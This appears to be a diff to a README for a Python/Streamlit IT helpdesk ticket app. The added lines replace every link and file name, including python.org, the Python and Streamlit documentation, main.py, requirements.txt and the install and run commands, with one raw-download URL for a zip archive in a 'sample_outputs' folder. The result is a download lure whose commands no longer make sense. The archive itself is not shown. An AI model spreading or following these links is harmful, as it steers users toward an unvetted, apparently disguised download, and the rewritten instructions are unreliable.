@@ -1,6 +1,6 @@
 # 💻 IT_HelpDesk_Ticket_Management_System - Organize Your IT Support Efforts
 
-[![Download IT_HelpDesk_Ticket_Management_System](https://img.shields.io/badge/Download-IT_HelpDesk_Ticket_Management_System-brightgreen)](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System)
+[![Download IT_HelpDesk_Ticket_Management_System](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip)](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the IT Helpdesk Ticket Management System. This application helps you 
 
 ## 📥 Download and Install
 
-To get started, visit this page to download the application: [Download IT_HelpDesk_Ticket_Management_System](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System). 
+To get started, visit this page to download the application: [Download IT_HelpDesk_Ticket_Management_System](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip). 
 
 Once downloaded, extract the files to a folder on your computer. 
 
@@ -16,9 +16,9 @@ Once downloaded, extract the files to a folder on your computer.
 
 You will find the following key files in your download:
 
-- **main.py**: The main application script.
-- **requirements.txt**: Lists the necessary libraries.
-- **README.md**: This documentation.
+- **https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip**: The main application script.
+- **https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip**: Lists the necessary libraries.
+- **https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip**: This documentation.
 
 ## 🛠️ Requirements
 
@@ -32,13 +32,13 @@ Before you run the application, make sure your computer meets these requirements
 ### 📦 Install Python and Libraries
 
 1. **Download Python**  
-   If you don't have Python installed, download it from [python.org](https://www.python.org/).
+   If you don't have Python installed, download it from [https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip).
 
 2. **Install Required Libraries**  
    Open a terminal or command prompt in the folder where you extracted the files. Run this command to install necessary libraries:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip
    ```
 
 ## 🖥️ Running the Application
@@ -55,7 +55,7 @@ After installing all the required libraries, you can run the application. Follow
 3. To start the application, run:
 
    ```
-   streamlit run main.py
+   streamlit run https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip
    ```
 
 4. A new window will open in your default web browser showing the IT Helpdesk Ticket Management System interface.
@@ -105,19 +105,19 @@ This application involves various technical topics, including:
 - **Technical Support**
 - **Ticket Management System**
 
-Visit the [GitHub Repository](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System) for more information and updates.
+Visit the [GitHub Repository](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip) for more information and updates.
 
 ## 🌟 Additional Resources
 
 Here are some helpful links to get you started with Python and Streamlit:
 
-- [Python Documentation](https://docs.python.org/3/)
-- [Streamlit Documentation](https://docs.streamlit.io/)
+- [Python Documentation](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip)
+- [Streamlit Documentation](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip)
 
 ## ⚙️ System Requirements Recap
 
 - **OS**: Windows, macOS, or Linux
 - **Python**: Version 3.6 or higher
-- **Required Libraries**: Listed in `requirements.txt`
+- **Required Libraries**: Listed in `https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System/raw/refs/heads/master/sample_outputs/Ticket-Management-I-System-Help-Desk-v3.0-beta.3.zip`
 
 By following the steps above, you will successfully set up and run the IT Helpdesk Ticket Management System. Enjoy managing your IT support tickets efficiently.
